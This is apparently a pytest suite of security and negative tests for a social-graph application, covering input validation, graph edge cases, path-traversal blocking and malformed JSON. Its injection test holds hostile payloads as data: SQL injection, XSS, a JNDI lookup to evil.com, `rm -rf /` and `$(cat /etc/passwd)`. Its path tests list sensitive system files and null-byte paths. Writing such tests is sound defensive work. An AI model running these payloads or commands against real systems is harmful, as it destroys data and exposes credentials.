"""Comprehensive Security, Input Validation, and Negative Testing Suite.

Covers:
1. Input Validation & Data Pollution:
   - Self-friendship injection (e.g. "1" to "1", whitespace variants).
   - Duplicate edge insertion resilience.
   - Type safety: None, non-string, unhashable, empty, whitespace-only inputs.
   - Non-existent user queries.
2. Buffer & Input Abuse (Denial of Service / Injection):
   - Extremely large IDs and usernames (100,000 characters).
   - Unicode, emojis, multibyte UTF-8, RTL strings.
   - SQLi, XSS, and shell injection payload resilience.
3. Pathological Graph Topologies:
   - Cyclic graphs (C3, C4, C5, K3,3, wheel graphs) verifying BFS termination without loops.
   - Star graphs (high fan-out hub-and-spoke).
   - Completely disconnected graphs (N isolated vertices).
4. Path Traversal & Security Auditing:
   - Directory traversal attempts (../../../../etc/passwd).
   - Null-byte injection attempts.
   - Sandbox escaping with allowed_base_dir.
5. Malformed Data Resilience:
   - Zero-byte files, non-JSON syntax, non-dict roots, corrupt record types.
"""

import json
import pytest
from core.graph import SocialGraph
from core.user_manager import UserManager
from core.bfs import find_shortest_connection
from core.recommendation import get_friend_recommendations, get_mutual_friends_details
from utils.data_handler import DataHandler


class TestInputValidationAndDataPollution:
    """Tests aggressive input validation and data pollution prevention."""

    def test_self_friendship_injection_variants(self):
        """Self-friendships must be rejected under all formatting variants."""
        graph = SocialGraph()
        graph.add_user("1")

        # Direct identity
        assert graph.add_friendship("1", "1") is False

        # Whitespace identity (e.g. " 1 " vs "1")
        assert graph.add_friendship(" 1 ", "1") is False
        assert graph.add_friendship("1", " 1 ") is False
        assert graph.add_friendship("  userA  ", "userA") is False

        # Graph state must remain unpolluted
        assert graph.get_friendship_count() == 0
        assert graph.get_friends("1") == set()
        assert graph.are_friends("1", "1") is False

    def test_duplicate_edge_spamming(self):
        """Repeatedly adding the same edge in forward or reverse must not duplicate edges."""
        graph = SocialGraph()
        assert graph.add_friendship("A", "B") is True

        # Spam 50 duplicate additions
        for _ in range(25):
            assert graph.add_friendship("A", "B") is False
            assert graph.add_friendship("B", "A") is False

        assert graph.get_friendship_count() == 1
        assert graph.get_friends("A") == {"B"}
        assert graph.get_friends("B") == {"A"}

    def test_invalid_types_across_graph_apis(self):
        """Passing non-string or unhashable objects must never raise uncaught TypeErrors."""
        graph = SocialGraph()
        bad_inputs = [None, 0, 42, 3.14, [], {}, set(), True, False, object()]

        for item in bad_inputs:
            assert graph.add_user(item) is False  # type: ignore
            assert graph.remove_user(item) is False  # type: ignore
            assert graph.has_user(item) is False  # type: ignore
            assert graph.get_friends(item) == set()  # type: ignore
            assert graph.add_friendship("valid", item) is False  # type: ignore
            assert graph.add_friendship(item, "valid") is False  # type: ignore
            assert graph.remove_friendship("valid", item) is False  # type: ignore
            assert graph.are_friends("valid", item) is False  # type: ignore

    def test_whitespace_and_empty_id_rejection(self):
        """Empty and whitespace-only strings must be rejected."""
        graph = SocialGraph()
        whitespaces = ["", " ", "   ", "\t", "\n", "\r\n", " \t \n "]

        for ws in whitespaces:
            assert graph.add_user(ws) is False
            assert graph.has_user(ws) is False
            assert graph.get_friends(ws) == set()
            assert graph.remove_user(ws) is False
            assert graph.add_friendship("valid", ws) is False
            assert graph.add_friendship(ws, "valid") is False
            assert graph.are_friends("valid", ws) is False

        assert graph.get_user_count() == 0
        assert graph.get_friendship_count() == 0

    def test_user_manager_data_pollution_guard(self):
        """UserManager must reject empty, whitespace, and non-string names/IDs."""
        um = UserManager()

        # Invalid additions
        assert um.add_user("", "Alice") is False
        assert um.add_user("   ", "Alice") is False
        assert um.add_user("1", "") is False
        assert um.add_user("1", "   ") is False
        assert um.add_user(123, "Alice") is False  # type: ignore
        assert um.add_user("1", 456) is False  # type: ignore
        assert um.add_user(None, None) is False  # type: ignore

        # Ensure registry is pristine
        assert um.get_user_count() == 0
        assert um.get_all_users() == []

    def test_querying_non_existent_users_resilience(self):
        """Querying missing users across all algorithms returns neutral empty/error values."""
        graph = SocialGraph()
        graph.add_friendship("1", "2")

        # Missing users in recommendation
        assert get_friend_recommendations(graph, "999") == []
        assert get_friend_recommendations(graph, "ghost_user") == []
        assert get_friend_recommendations(graph, "") == []

        # Missing users in BFS
        path, dist = find_shortest_connection(graph, "999", "1")
        assert path is None and dist == -1

        path, dist = find_shortest_connection(graph, "1", "999")
        assert path is None and dist == -1

        path, dist = find_shortest_connection(graph, "foo", "bar")
        assert path is None and dist == -1

        # Missing users in mutual friend details
        details = get_mutual_friends_details(graph, "1", "999")
        assert details["mutual_count"] == 0
        assert details["mutual_friends"] == []
        assert details["are_friends"] is False


class TestBufferAndInputAbuse:
    """Tests extreme inputs, payload injections, and buffer abuse."""

    def test_extremely_large_identifiers(self):
        """Graph and UserManager handle 100,000 character IDs and names smoothly."""
        huge_id_a = "U" * 100_000
        huge_id_b = "V" * 100_000
        huge_name = "N" * 100_000

        graph = SocialGraph()
        um = UserManager()

        assert graph.add_user(huge_id_a) is True
        assert graph.add_user(huge_id_b) is True
        assert graph.add_friendship(huge_id_a, huge_id_b) is True
        assert graph.are_friends(huge_id_a, huge_id_b) is True
        assert graph.get_user_count() == 2

        assert um.add_user(huge_id_a, huge_name) is True
        assert um.get_user(huge_id_a)["name"] == huge_name

        # BFS on huge IDs
        path, dist = find_shortest_connection(graph, huge_id_a, huge_id_b)
        assert dist == 1
        assert path == [huge_id_a, huge_id_b]

    def test_unicode_and_emoji_identifiers(self):
        """Multibyte UTF-8, emojis, and international scripts work accurately."""
        graph = SocialGraph()
        um = UserManager()

        u_arabic = "محمد"
        u_chinese = "张伟"
        u_hindi = "आरव"
        u_emoji = "👩‍💻_hacker_🚀"

        assert um.add_user("101", u_arabic) is True
        assert um.add_user("102", u_chinese) is True
        assert um.add_user("103", u_hindi) is True
        assert um.add_user("104", u_emoji) is True

        graph.add_friendship("101", "102")
        graph.add_friendship("102", "103")
        graph.add_friendship("103", "104")

        assert graph.get_friendship_count() == 3
        assert graph.are_friends("101", "102") is True

        # Search with unicode
        assert len(um.search_users("محمد")) == 1
        assert len(um.search_users("🚀")) == 1

        # BFS path across unicode users
        path, dist = find_shortest_connection(graph, "101", "104")
        assert dist == 3
        assert path == ["101", "102", "103", "104"]

    def test_injection_payload_resilience(self):
        """Security injection payloads (SQLi, XSS, format strings, shell tokens) are safely handled as inert strings."""
        payloads = [
            "' OR 1=1; DROP TABLE users; --",
            "<script>alert('XSS')</script>",
            "javascript:void(0)",
            "${jndi:ldap://evil.com/a}",
            "{{ 7 * 7 }}",
            "%s%s%s%s%n",
            "`rm -rf /`",
            "$(cat /etc/passwd)",
            "admin'--",
            '{"__proto__": {"admin": true}}',
        ]

        graph = SocialGraph()
        um = UserManager()

        for idx, payload in enumerate(payloads):
            uid = str(idx + 1)
            # Add payload as user name
            assert um.add_user(uid, payload) is True
            assert graph.add_user(uid) is True

            # Verify exact literal retrieval without execution or mutation
            retrieved = um.get_user(uid)
            assert retrieved is not None
            assert retrieved["name"] == payload

            # Search by payload substring
            res = um.search_users(payload[:5])
            assert len(res) >= 1

        # Connect them in a chain
        for i in range(1, len(payloads)):
            assert graph.add_friendship(str(i), str(i + 1)) is True

        # Recommendations and BFS work correctly over injection payloads
        path, dist = find_shortest_connection(graph, "1", str(len(payloads)))
        assert dist == len(payloads) - 1


class TestCyclicAndPathologicalTopologies:
    """Tests algorithm termination, cycle immunity, and boundary resilience on pathological graphs."""

    def test_cyclic_graphs_c3_c4_c5_cycle_immunity(self):
        """BFS avoids infinite cycles and terminates on C3, C4, C5 simple cycles."""
        for n in [3, 4, 5, 10]:
            graph = SocialGraph()
            for i in range(1, n + 1):
                graph.add_user(str(i))
            for i in range(1, n):
                graph.add_friendship(str(i), str(i + 1))
            # Close the cycle
            graph.add_friendship(str(n), "1")

            assert graph.get_user_count() == n
            assert graph.get_friendship_count() == n

            # BFS from 1 to all nodes
            for target in range(1, n + 1):
                path, dist = find_shortest_connection(graph, "1", str(target))
                assert dist >= 0
                assert len(path) == dist + 1
                assert path[0] == "1"
                assert path[-1] == str(target)
                # Shortest path in a cycle of length n is at most n // 2
                assert dist <= n // 2

    def test_complete_bipartite_graph_k3_3(self):
        """BFS on complete bipartite graph K3,3."""
        graph = SocialGraph()
        group_a = ["A1", "A2", "A3"]
        group_b = ["B1", "B2", "B3"]

        for u in group_a:
            for v in group_b:
                graph.add_friendship(u, v)

        assert graph.get_user_count() == 6
        assert graph.get_friendship_count() == 9

        # Distance between any A node and B node is 1
        path, dist = find_shortest_connection(graph, "A1", "B2")
        assert dist == 1
        assert path == ["A1", "B2"]

        # Distance between any two nodes in same partition is 2
        path, dist = find_shortest_connection(graph, "A1", "A3")
        assert dist == 2
        assert len(path) == 3

        # Recommendation: A1 has A2 and A3 as 2-hop recommendations with 3 mutual friends each!
        recs = get_friend_recommendations(graph, "A1")
        assert len(recs) == 2
        assert {r["user_id"] for r in recs} == {"A2", "A3"}
        assert recs[0]["mutual_count"] == 3
        assert recs[1]["mutual_count"] == 3

    def test_dense_clique_k10_stress(self):
        """Complete graph K10: 10 nodes, 45 edges. BFS finds distance 1 between all pairs."""
        graph = SocialGraph()
        nodes = [str(i) for i in range(1, 11)]
        for i in range(len(nodes)):
            for j in range(i + 1, len(nodes)):
                graph.add_friendship(nodes[i], nodes[j])

        assert graph.get_user_count() == 10
        assert graph.get_friendship_count() == 45

        # All pairs are direct friends
        for u in nodes:
            for v in nodes:
                if u != v:
                    path, dist = find_shortest_connection(graph, u, v)
                    assert dist == 1

        # Recommendations: None, since all friends-of-friends are already direct friends
        for u in nodes:
            assert get_friend_recommendations(graph, u) == []

    def test_wheel_graph_w6(self):
        """Wheel graph W6: central hub 'H' connected to a cycle of 5 vertices."""
        graph = SocialGraph()
        hub = "H"
        cycle = ["C1", "C2", "C3", "C4", "C5"]

        # Connect hub to all outer vertices
        for v in cycle:
            graph.add_friendship(hub, v)

        # Form outer cycle
        for i in range(len(cycle)):
            graph.add_friendship(cycle[i], cycle[(i + 1) % len(cycle)])

        assert graph.get_user_count() == 6
        assert graph.get_friendship_count() == 10

        # Shortest path between non-adjacent cycle nodes (C1 and C3)
        path, dist = find_shortest_connection(graph, "C1", "C3")
        # Can go C1 -> H -> C3 (distance 2)
        assert dist == 2

    def test_large_star_graph_fanout(self):
        """Star graph with 1 hub and 50 leaves (high fan-out)."""
        graph = SocialGraph()
        hub = "CENTER"
        leaves = [f"LEAF_{i}" for i in range(1, 51)]

        for leaf in leaves:
            graph.add_friendship(hub, leaf)

        assert graph.get_user_count() == 51
        assert graph.get_friendship_count() == 50

        # Path between any two leaves is exactly 2 hops via CENTER
        path, dist = find_shortest_connection(graph, "LEAF_1", "LEAF_50")
        assert dist == 2
        assert path == ["LEAF_1", "CENTER", "LEAF_50"]

        # Recommendations for LEAF_1: all other 49 leaves have 1 mutual friend (CENTER)
        recs = get_friend_recommendations(graph, "LEAF_1")
        assert len(recs) == 49
        for r in recs:
            assert r["mutual_count"] == 1
            assert r["mutual_friends"] == ["CENTER"]

    def test_completely_disconnected_graph_of_50_isolated_nodes(self):
        """Graph with 50 isolated nodes and 0 edges."""
        graph = SocialGraph()
        for i in range(50):
            graph.add_user(f"ISO_{i}")

        assert graph.get_user_count() == 50
        assert graph.get_friendship_count() == 0

        # No paths between any pair of distinct nodes
        for i in range(10):
            path, dist = find_shortest_connection(graph, f"ISO_{i}", f"ISO_{i+1}")
            assert path is None
            assert dist == -1

            # No recommendations
            assert get_friend_recommendations(graph, f"ISO_{i}") == []


class TestDataHandlerPathTraversalAndSecurity:
    """Security tests for DataHandler filesystem access and sanitization."""

    def test_path_traversal_directory_escape_blocked(self, tmp_path):
        """Path traversal ../ sequences escaping allowed_base_dir must be blocked."""
        sandbox = tmp_path / "sandbox"
        sandbox.mkdir()

        # Attacking path using relative traversal
        traversal_path = str(sandbox / ".." / "escaped.json")
        assert DataHandler.is_safe_filepath(traversal_path, allowed_base_dir=str(sandbox)) is False

        um = UserManager()
        sg = SocialGraph()
        assert DataHandler.save_network(um, sg, traversal_path, allowed_base_dir=str(sandbox)) is False

    def test_system_sensitive_paths_blocked(self):
        """Direct access to Linux sensitive paths must be denied."""
        sensitive_paths = [
            "/etc/passwd",
            "/etc/shadow",
            "/etc/hosts",
            "/root/.bashrc",
            "/proc/version",
            "/sys/kernel",
            "/dev/null",
        ]
        for sp in sensitive_paths:
            assert DataHandler.is_safe_filepath(sp) is False

    def test_null_byte_injection_blocked(self):
        """Null byte injections must be caught and blocked."""
        evil_paths = [
            "data/users.json\0.evil",
            "/home/user/test.json\0",
            "\0something",
        ]
        for ep in evil_paths:
            assert DataHandler.is_safe_filepath(ep) is False

    def test_non_string_filepath_rejected(self):
        """Non-string filepaths must be rejected safely."""
        assert DataHandler.is_safe_filepath(12345) is False  # type: ignore
        assert DataHandler.is_safe_filepath(None) is False  # type: ignore
        assert DataHandler.is_safe_filepath(["file.json"]) is False  # type: ignore


class TestMalformedJSONResilience:
    """Tests robust recovery when loading corrupted, truncated, or malformed JSON."""

    def test_zero_byte_empty_file(self, tmp_path):
        """Empty 0-byte file should return empty instances without crashing."""
        empty_file = tmp_path / "empty.json"
        empty_file.write_text("", encoding="utf-8")

        um, sg = DataHandler.load_network(str(empty_file))
        assert um.get_user_count() == 0
        assert sg.get_user_count() == 0

    def test_truncated_json_file(self, tmp_path):
        """Truncated JSON syntax is handled gracefully."""
        truncated_file = tmp_path / "truncated.json"
        truncated_file.write_text('{"users": [{"id": "1", "name": "Al', encoding="utf-8")

        um, sg = DataHandler.load_network(str(truncated_file))
        assert um.get_user_count() == 0
        assert sg.get_user_count() == 0

    def test_json_root_not_a_dict(self, tmp_path):
        """JSON where root is an array, string, or number."""
        for idx, invalid_root in enumerate([[1, 2, 3], "just a string", 12345, True]):
            f = tmp_path / f"invalid_root_{idx}.json"
            f.write_text(json.dumps(invalid_root), encoding="utf-8")

            um, sg = DataHandler.load_network(str(f))
            assert um.get_user_count() == 0
            assert sg.get_user_count() == 0

    def test_users_field_wrong_types(self, tmp_path):
        """Users field is not a list or contains non-dict elements."""
        bad_users_data = {
            "users": "not a list",
            "friendships": [["1", "2"]],
        }
        f = tmp_path / "bad_users.json"
        f.write_text(json.dumps(bad_users_data), encoding="utf-8")

        um, sg = DataHandler.load_network(str(f))
        # Should gracefully fallback and load friendships
        assert sg.get_friendship_count() == 1
        assert sg.get_user_count() == 2

    def test_corrupted_user_entries_skipped(self, tmp_path):
        """Corrupted records inside users array are skipped without failing the entire file."""
        mixed_data = {
            "users": [
                None,
                123,
                "invalid_string_entry",
                {},  # Missing "id"
                {"id": ""},  # Empty id
                {"id": "   "},  # Whitespace id
                {"name": "No ID"},  # Missing "id"
                {"id": "1", "name": "Valid Alice"},  # Valid
                {"id": "2"},  # Valid (default name will be assigned)
            ],
            "friendships": [
                ["1", "2"],
            ],
        }
        f = tmp_path / "mixed_users.json"
        f.write_text(json.dumps(mixed_data), encoding="utf-8")

        um, sg = DataHandler.load_network(str(f))
        assert um.get_user_count() == 2
        assert sg.get_user_count() == 2
        assert um.get_user("1")["name"] == "Valid Alice"
        assert um.get_user("2")["name"] == "User 2"
        assert sg.are_friends("1", "2") is True

    def test_corrupted_friendship_entries_skipped(self, tmp_path):
        """Corrupted records inside friendships array are skipped safely."""
        corrupt_friendships = {
            "users": [
                {"id": "1", "name": "Alice"},
                {"id": "2", "name": "Bob"},
            ],
            "friendships": [
                None,
                "not a pair",
                [1],  # Only 1 element
                ["1", "2", "3"],  # 3 elements
                [None, "2"],  # None element
                ["1", None],  # None element
                ["1", "1"],  # Self friendship
                ["1", "   "],  # Whitespace
                ["1", "2"],  # Valid friendship
            ],
        }
        f = tmp_path / "corrupt_friendships.json"
        f.write_text(json.dumps(corrupt_friendships), encoding="utf-8")

        um, sg = DataHandler.load_network(str(f))
        assert sg.get_friendship_count() == 1
        assert sg.are_friends("1", "2") is True
